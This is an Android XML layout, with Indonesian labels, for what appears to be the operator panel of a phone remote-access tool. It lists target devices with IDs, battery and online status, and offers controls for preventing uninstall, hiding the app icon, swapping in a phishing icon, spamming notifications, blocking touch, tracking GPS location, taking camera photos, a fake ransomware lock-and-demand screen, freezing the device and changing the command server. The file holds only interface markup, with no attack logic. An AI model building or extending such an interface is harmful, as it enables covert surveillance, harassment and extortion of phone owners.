<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#000000">

    <!-- Header: ← 🔒 🔍 🔗 -->
    <LinearLayout
        android:id="@+id/header"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:layout_marginStart="16dp"
        android:layout_marginTop="16dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="←"
            android:textColor="#FFFFFF"
            android:textSize="28sp"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text=" 🔒 "
            android:textColor="#FFFFFF"
            android:textSize="28sp"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="🔍"
            android:textColor="#FFFFFF"
            android:textSize="28sp"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text=" 🔗"
            android:textColor="#FFFFFF"
            android:textSize="28sp"/>

    </LinearLayout>

    <!-- Konten Scroll -->
    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_below="@id/header"
        android:layout_above="@+id/bottomNumber"
        android:padding="16dp">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical">

            <!-- Device Info -->
            <TextView
                android:id="@+id/tvDeviceName"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="2409BRN2CY"
                android:textColor="#FFFFFF"
                android:textSize="18sp"
                android:textStyle="bold"
                android:layout_marginTop="8dp"/>

            <TextView
                android:id="@+id/tvStatus"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="ONLINE"
                android:textColor="#00FF41"
                android:textSize="14sp"/>

            <TextView
                android:id="@+id/tvDeviceId"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="83c220bfb0ee8435"
                android:textColor="#888888"
                android:textSize="12sp"/>

            <!-- Anti Uninstall -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginTop="8dp"
                android:layout_marginBottom="8dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Anti Uninstall"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <TextView
                    android:id="@+id/tvAntiUninstallText"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="OFF"
                    android:textColor="#FF1744"
                    android:textSize="14sp"
                    android:layout_marginEnd="8dp"/>

                <Switch
                    android:id="@+id/swAntiUninstall"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:thumbTint="#FF1744"
                    android:trackTint="#333333"/>
            </LinearLayout>

            <!-- GANTI -->
            <Button
                android:id="@+id/btnGanti"
                android:layout_width="match_parent"
                android:layout_height="48dp"
                android:text="GANTI"
                android:textColor="#FFFFFF"
                android:background="#1A1A1A"
                android:textStyle="bold"
                android:layout_marginBottom="8dp"/>

            <!-- Device Info 2 -->
            <TextView
                android:id="@+id/tvDeviceName2"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="vivo Y20s"
                android:textColor="#FFFFFF"
                android:textSize="14sp"/>

            <TextView
                android:id="@+id/tvDeviceId2"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="1e5b8925ea01bef1"
                android:textColor="#888888"
                android:textSize="12sp"/>

            <TextView
                android:id="@+id/tvBattery"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="27%"
                android:textColor="#FFFFFF"
                android:textSize="14sp"
                android:textStyle="bold"
                android:layout_marginBottom="16dp"/>

            <!-- KONTROL DEVICE -->
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="KONTROL DEVICE"
                android:textColor="#FFFFFF"
                android:textSize="18sp"
                android:textStyle="bold"
                android:layout_marginBottom="16dp"/>

            <!-- Flashlight -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Flashlight"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <TextView
                    android:id="@+id/tvFlashlightStatus"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="OFF"
                    android:textColor="#FF1744"
                    android:textSize="14sp"
                    android:layout_marginEnd="8dp"/>

                <Switch
                    android:id="@+id/swFlashlight"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:thumbTint="#FF1744"
                    android:trackTint="#333333"/>
            </LinearLayout>

            <!-- Lock low -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Lock low"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <TextView
                    android:id="@+id/tvLockLowStatus"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="OFF"
                    android:textColor="#FF1744"
                    android:textSize="14sp"
                    android:layout_marginEnd="8dp"/>

                <Switch
                    android:id="@+id/swLockLow"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:thumbTint="#FF1744"
                    android:trackTint="#333333"/>
            </LinearLayout>

            <!-- Lock Custom V2 -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Lock Custom V2"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <TextView
                    android:id="@+id/tvLockCustomStatus"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="OFF"
                    android:textColor="#FF1744"
                    android:textSize="14sp"
                    android:layout_marginEnd="8dp"/>

                <Switch
                    android:id="@+id/swLockCustom"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:thumbTint="#FF1744"
                    android:trackTint="#333333"/>
            </LinearLayout>

            <!-- Tema Phising -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Tema Phising"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <Button
                    android:id="@+id/btnTemaPhising"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="TAP, GANTI ICON"
                    android:textColor="#FFFFFF"
                    android:background="@null"
                    android:textSize="12sp"/>
            </LinearLayout>

            <!-- Hide Icon -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Hide Icon"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <TextView
                    android:id="@+id/tvHideIconStatus"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="OFF"
                    android:textColor="#FF1744"
                    android:textSize="14sp"
                    android:layout_marginEnd="8dp"/>

                <Switch
                    android:id="@+id/swHideIcon"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:thumbTint="#FF1744"
                    android:trackTint="#333333"/>
            </LinearLayout>

            <!-- Video Overlay -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Video Overlay"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <Button
                    android:id="@+id/btnVideoOverlay"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="TAP, PLAY VIDEO"
                    android:textColor="#FFFFFF"
                    android:background="@null"
                    android:textSize="12sp"/>
            </LinearLayout>

            <!-- Spam Notifikasi -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Spam Notifikasi"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <Button
                    android:id="@+id/btnSpamNotif"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="TAP, SPAM DIALOG"
                    android:textColor="#FFFFFF"
                    android:background="@null"
                    android:textSize="12sp"/>
            </LinearLayout>

            <!-- Stuck Layar -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Stuck Layar"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <Button
                    android:id="@+id/btnStuckLayar"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="TAP, BLOCK TOUCH"
                    android:textColor="#FFFFFF"
                    android:background="@null"
                    android:textSize="12sp"/>
            </LinearLayout>

            <!-- GPS -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="GPS - Lacak Lokasi"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <Button
                    android:id="@+id/btnGPS"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="TAP, LACAK"
                    android:textColor="#FFFFFF"
                    android:background="@null"
                    android:textSize="12sp"/>
            </LinearLayout>

            <!-- Kamera -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Kamera - Ambil Foto"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <Button
                    android:id="@+id/btnKamera"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="TAP, FOTO"
                    android:textColor="#FFFFFF"
                    android:background="@null"
                    android:textSize="12sp"/>
            </LinearLayout>

            <!-- Fake Ransomware -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="Fake Ransomware"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <Button
                    android:id="@+id/btnRansomware"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="TAP, LOCK &amp; MINTA"
                    android:textColor="#FF1744"
                    android:background="@null"
                    android:textSize="12sp"/>
            </LinearLayout>

            <!-- Ngehang -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginBottom="4dp">

                <TextView
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:text="💀 Ngehang"
                    android:textColor="#FFFFFF"
                    android:textSize="16sp"/>

                <TextView
                    android:id="@+id/tvNgehangStatus"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="OFF"
                    android:textColor="#FF1744"
                    android:textSize="14sp"
                    android:layout_marginEnd="8dp"/>

                <Switch
                    android:id="@+id/swNgehang"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:thumbTint="#FF1744"
                    android:trackTint="#333333"/>
            </LinearLayout>

            <!-- Ganti Server -->
            <EditText
                android:id="@+id/etServerUrl"
                android:layout_width="match_parent"
                android:layout_height="48dp"
                android:hint="Masukkan URL server baru..."
                android:textColor="#FFFFFF"
                android:textColorHint="#666666"
                android:background="#1A1A1A"
                android:padding="12dp"
                android:layout_marginTop="16dp"
                android:layout_marginBottom="8dp"/>

            <Button
                android:id="@+id/btnSetServer"
                android:layout_width="match_parent"
                android:layout_height="48dp"
                android:text="GANTI SERVER"
                android:textColor="#000000"
                android:background="#FFFFFF"
                android:textStyle="bold"/>

        </LinearLayout>

    </ScrollView>

    <!-- Angka 88 di pojok kanan bawah -->
    <TextView
        android:id="@+id/bottomNumber"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="88"
        android:textColor="#FFFFFF"
        android:textSize="48sp"
        android:textStyle="bold"
        android:layout_alignParentBottom="true"
        android:layout_alignParentEnd="true"
        android:layout_marginEnd="16dp"
        android:layout_marginBottom="16dp"/>

</RelativeLayout>
